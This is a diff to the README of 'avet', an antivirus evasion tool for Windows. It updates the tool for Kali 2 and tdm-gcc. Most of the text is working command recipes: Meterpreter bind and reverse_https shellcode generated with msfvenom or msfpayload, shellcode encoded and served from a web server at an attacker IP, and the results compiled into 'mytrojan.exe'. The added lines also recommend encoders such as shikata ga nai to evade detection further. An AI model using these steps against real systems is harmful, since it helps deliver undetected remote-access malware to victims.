@@ -1,17 +1,23 @@
 AntiVirus Evasion Tool
 ======================
 
-Please note that this tool was developed based on Backtrack 5, which I still use for some things. Shellcode downloading (-u) is a bit buggy and noisy, so better use the -f switch. Unfortunately I do not have the time to enhance avet or to develop a version that is running with kali. But I think nevertheless it might be interesting for some people. 
+Avet was developed based on Backtrack 5, but also works with Kali 2. Shellcode downloading (-u) is a bit buggy and noisy, so better use the -f switch. 
+
+Because of the huge interest I decided to spend some time for enhancing & developing avet.
 
 For basics about antivirus evasion have a look at my old article: https://govolutionde.files.wordpress.com/2014/05/avevasion_pentestmag.pdf
+and: https://deepsec.net/docs/Slides/2014/Why_Antivirus_Fails_-_Daniel_Sauder.pdf
 
 What & Why:
 - when running an exe file made with msfpayload & co, the exe file will often be recognized by the antivirus software
 - avet is a antivirus evasion tool targeting windows machines
 - avet includes two tools, avet.exe with different antivirus eavasion techniques and make_avet for compiling a preconfigured binary file
-- avet.exe loads ASCII encoded shellcode from a textfile or from a webserver
+- avet.exe loads ASCII encoded shellcode from a textfile or from a webserver, further it is using an av evasion technique to avoid sandboxing and emulation
 - for encoding the shellcode the tool format.sh and sh_format are included
-- Tools used: Based on Backtrack 5, wine, MinGW, metasploit. Works fine on different systems.
+- this readme applies for Kali 2 and tdm-gcc
+
+How to install tdm-gcc with wine:
+https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/
 
 
 How to use avet.exe
@@ -23,7 +29,7 @@ Example 1, loading shellcode from a file:
 
 Attackers machine:
 ```
-$ msfpayload windows/meterpreter/bind_tcp C > sc.txt
+$ msfvenom -p windows/meterpreter/bind_tcp -f c -a x86 --platform Windows > sh.txt
 $ ./format.sh sc.txt > sc_clean.txt
 ```
 
@@ -75,7 +81,7 @@ Example 1, compile shellcode into the .exe file:
 $ msfpayload windows/meterpreter/reverse_https lhost=192.168.2.112 lport=443 C > sh.txt
 $ ./format.sh sh.txt > sh_clean.txt
 $ ./make_avet -f sh_clean.txt
-$ wine ~/.wine/drive_c/MinGW/bin/gcc.exe -o mytrojan.exe avet.c
+$ wine gcc.exe -o mytrojan.exe avet.c
 ```
 
 Example 2, make an .exe file that downloads a shellcode from a webserver:
@@ -84,7 +90,7 @@ $ msfpayload windows/meterpreter/reverse_https lhost=192.168.2.112 lport=443 C >
 $ ./format.sh sh.txt > sh_clean.txt
 $ cp sh_clean.txt /var/www
 $ ./make_avet -u 192.168.2.112/sh_clean.txt
-$ wine ~/.wine/drive_c/MinGW/bin/gcc.exe -o mytrojan.exe avet.c
+$ wine gcc.exe -o mytrojan.exe avet.c
 ```
 
 Check out the other options as well:
@@ -99,9 +105,11 @@ Some notes
 ----------
 
 Rebuild avet.exe:
-No problem, ensure no content is in defs.h (echo "">defs.h), then compile with:
+No problem, ensure no content is in defs.h (`echo "">defs.h`), then compile with:
 ```
-$ wine ~/.wine/drive_c/MinGW/bin/gcc.exe -o avet.exe avet.c
+$ wine gcc.exe -o avet.exe avet.c
 ```
 
 Have a look for build.sh for easier handling.
+
+For adding more random (and lower chances of detection) to the binary additionaly use msf encoders like shikata ga nai.
